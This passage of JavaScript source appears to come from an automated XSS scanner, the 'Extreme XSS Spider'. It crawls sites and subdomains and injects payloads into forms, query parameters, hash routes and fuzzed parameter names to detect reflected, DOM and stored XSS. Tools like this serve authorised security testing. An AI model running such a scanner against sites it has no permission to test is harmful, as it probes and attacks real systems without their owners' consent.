                    type: 'Reflected',
                    endpoint: ctxTestUrl,
                    parameter: input.name,
                    payload: ctxPayload,
                    status: 'Potential',
                    evidence: 'Context-aware payload reflected.'
                  });
                  break;
                }
                if (domXss && JSDOM) {
                  try {
                    const dom = new JSDOM(ctxTestResp.body, { runScripts: 'dangerously' });
                    if (dom.window.document.body.innerHTML.includes(ctxPayload)) {
                      foundVuln = true;
                      reportFinding({
                        type: 'DOM',
                        endpoint: ctxTestUrl,
                        parameter: input.name,
                        payload: ctxPayload,
                        status: 'Potential',
                        evidence: 'Context-aware payload in DOM.'
                      });
                      break;
                    }
                  } catch {}
                }
              }
            }
          }
        }
      }
      // Test input-like elements (search bars, textareas, etc.)
      for (const inputLike of inputLikes) {
        for (const payload of payloads) {
          const variants = generatePayloadVariants(payload);
          for (const variant of variants) {
            // Try injecting via hash/query param if possible
            let testUrl = url;
            let testResp;
            // Try #/search?q= variant if hash present
            if (url.includes('#/')) {
              const hashIdx = url.indexOf('#/');
              const base = url.substring(0, hashIdx + 2);
              testUrl = base + `search?q=${encodeURIComponent(variant)}`;
            } else {
              // Try ?q= variant
              const u = new URL(url);
              u.searchParams.set(inputLike.name, variant);
              testUrl = u.href;
            }
            try {
              testResp = await fetchUrl(testUrl);
            } catch (e) { continue; }
            if (testResp.body.includes(variant)) {
              reportFinding({
                type: 'Reflected',
                endpoint: testUrl,
                parameter: inputLike.name,
                payload: variant,
                status: 'Potential',
                evidence: 'Payload reflected via input-like element.'
              });
            }
            if (domXss && JSDOM) {
              try {
                const dom = new JSDOM(testResp.body, { runScripts: 'dangerously' });
                if (dom.window.document.body.innerHTML.includes(variant)) {
                  reportFinding({
                    type: 'DOM',
                    endpoint: testUrl,
                    parameter: inputLike.name,
                    payload: variant,
                    status: 'Potential',
                    evidence: 'Payload in DOM via input-like element.'
                  });
                }
              } catch {}
            }
          }
        }
      }
      // Try clicking clickable elements (simulate client-side navigation)
      for (const clickable of clickables) {
        // Try to extract JS or hash navigation
        let href = clickable.getAttribute && clickable.getAttribute('href');
        if (href && href.startsWith('#/')) {
          for (const payload of payloads) {
            const testUrl = url.split('#')[0] + href + `?q=${encodeURIComponent(payload)}`;
            let testResp;
            try {
              testResp = await fetchUrl(testUrl);
            } catch (e) { continue; }
            if (testResp.body.includes(payload)) {
              reportFinding({
                type: 'Reflected',
                endpoint: testUrl,
                parameter: 'q',
                payload,
                status: 'Potential',
                evidence: 'Payload reflected via clickable navigation.'
              });
            }
            if (domXss && JSDOM) {
              try {
                const dom = new JSDOM(testResp.body, { runScripts: 'dangerously' });
                if (dom.window.document.body.innerHTML.includes(payload)) {
                  reportFinding({
                    type: 'DOM',
                    endpoint: testUrl,
                    parameter: 'q',
                    payload,
                    status: 'Potential',
                    evidence: 'Payload in DOM via clickable navigation.'
                  });
                }
              } catch {}
            }
          }
        }
      }
      // Test query parameters for XSS (even if no forms)
      try {
        const urlObj = new URL(url);
        const params = Array.from(urlObj.searchParams.keys());
        if (params.length > 0) {
          log(`[PARAMLESS] Testing ${params.length} query parameters on ${url}`);
          for (const param of params) {
            log(`[PARAMLESS] Testing query parameter '${param}' on ${url}`);
            let foundVuln = false;
            for (const payload of payloads) {
              if (stopRequested) return;
              const variants = generatePayloadVariants(payload);
              for (const variant of variants) {
                const testUrlObj = new URL(url);
                testUrlObj.searchParams.set(param, variant);
                const testUrl = testUrlObj.href;
                let testResp;
                try {
                  log(`[TRY] Query param test: ${testUrl} with '${param}' = ${variant}`);
                  testResp = await fetchUrl(testUrl);
                } catch (e) {
                  log(`[ERROR] Query param test failed for ${testUrl}: ${e.message}`);
                  continue;
                }
                // Context-aware payloads for query param
                let context = detectInjectionContext(testResp.body, param, variant);
                let contextPayloads = getContextAwarePayloads(context);
                for (const ctxPayload of contextPayloads) {
                  const ctxTestUrlObj = new URL(url);
                  ctxTestUrlObj.searchParams.set(param, ctxPayload);
                  const ctxTestUrl = ctxTestUrlObj.href;
                  let ctxTestResp;
                  try {
                    ctxTestResp = await fetchUrl(ctxTestUrl);
                  } catch (e) { continue; }
                  if (ctxTestResp.body.includes(ctxPayload)) {
                    foundVuln = true;
                    reportFinding({
                      type: 'Reflected',
                      endpoint: ctxTestUrl,
                      parameter: param,
                      payload: ctxPayload,
                      status: 'Potential',
                      evidence: 'Context-aware payload reflected.'
                    });
                    break;
                  }
                  if (domXss && JSDOM) {
                    try {
                      const dom = new JSDOM(ctxTestResp.body, { runScripts: 'dangerously' });
                      if (dom.window.document.body.innerHTML.includes(ctxPayload)) {
                        foundVuln = true;
                        reportFinding({
                          type: 'DOM',
                          endpoint: ctxTestUrl,
                          parameter: param,
                          payload: ctxPayload,
                          status: 'Potential',
                          evidence: 'Context-aware payload in DOM.'
                        });
                        break;
                      }
                    } catch {}
                  }
                }
              }
            }
          }
        }
        // --- Parameter mining/fuzzing ---
        for (const fuzzParam of paramFuzzer(paramWordlist)) {
          for (const payload of payloads) {
            const testUrlObj = new URL(url);
            testUrlObj.searchParams.set(fuzzParam, payload);
            const testUrl = testUrlObj.href;
            let testResp;
            try {
              testResp = await fetchUrl(testUrl);
            } catch (e) { continue; }
            if (testResp.body.includes(payload)) {
              reportFinding({
                type: 'Reflected',
                endpoint: testUrl,
                parameter: fuzzParam,
                payload,
                status: 'Potential',
                evidence: 'Payload reflected in response (param mining).'
              });
            }
            if (domXss && JSDOM) {
              try {
                const dom = new JSDOM(testResp.body, { runScripts: 'dangerously' });
                if (dom.window.document.body.innerHTML.includes(payload)) {
                  reportFinding({
                    type: 'DOM',
                    endpoint: testUrl,
                    parameter: fuzzParam,
                    payload,
                    status: 'Potential',
                    evidence: 'Payload in DOM (param mining).'
                  });
                }
              } catch {}
            }
          }
        }
      } catch (e) {
        log(`[ERROR] Query param XSS test error at ${url}: ${e.message}`);
      }
      if (d + 1 <= depth) {
        for (const link of links) {
          if (sameDomain && !link.startsWith(new URL(startUrl).origin)) continue;
          if (!visited.has(link)) queued.push({ url: link, depth: d + 1 });
        }
        const subdomains = extractSubdomains(links, baseDomain);
        for (const sub of subdomains) {
          if (!visited.has(sub)) {
            log(`[SUBDOMAIN] Discovered subdomain: ${sub}`);
            queued.push({ url: sub, depth: d + 1 });
          }
        }
      }
    }));
  }
  if (storedPayloads.length > 0) {
    log('[STORED] Checking for stored XSS in all visited URLs...');
    for (const vurl of Array.from(visited)) {
      let resp;
      try {
        resp = await fetchUrl(vurl);
      } catch (e) {
        log(`[ERROR] Failed to fetch for stored XSS: ${vurl}: ${e.message}`);
        continue;
      }
      for (const { payload, url: submitUrl, param } of storedPayloads) {
        if (resp.body.includes(payload)) {
          reportFinding({
            type: 'Stored',
            endpoint: vurl,
            parameter: param,
            payload,
            status: 'Potential',
            evidence: `Payload from ${submitUrl} found at ${vurl}`
          });
          log(`[VULN] Stored XSS: payload from ${submitUrl} found at ${vurl}`);
        }
      }
    }
  }
  running = false;
  updateStatus('Idle');
  log('[COMPLETE] Extreme XSS Spider finished.');
}

// --- IPC listeners from parent process ---
process.on('message', async (msg) => {
  if (!msg || !msg.type) return;
  if (msg.type === 'start') {
    if (running) return;
    options = msg.data;
    if (options.puppeteerMode) {
      const findings = await puppeteerXssSpider({
        startUrl: options.url,
        payloadSet: options.payloadSet,
        maxDepth: options.depth || 3,
        headless: true,
        timeout: 20000
      });
      for (const finding of findings) reportFinding(finding);
      updateStatus('Idle');
      return;
    }
    loadPayloads(options.payloadSet);
    await crawlAndTest(options.url, options.depth, options.sameDomain, options.followForms, options.domXss, options.smartMode, options.threads);
  } else if (msg.type === 'stop') {
    stopRequested = true;
    running = false;
    updateStatus('Stopped');
    log('XSS Spider stopped by user.', 'action');
  }
});

// Expose for preload or contextBridge if needed
module.exports = {
  start: (opts) => process.send({ type: 'start', data: opts }),
  stop: () => process.send({ type: 'stop' }),
};
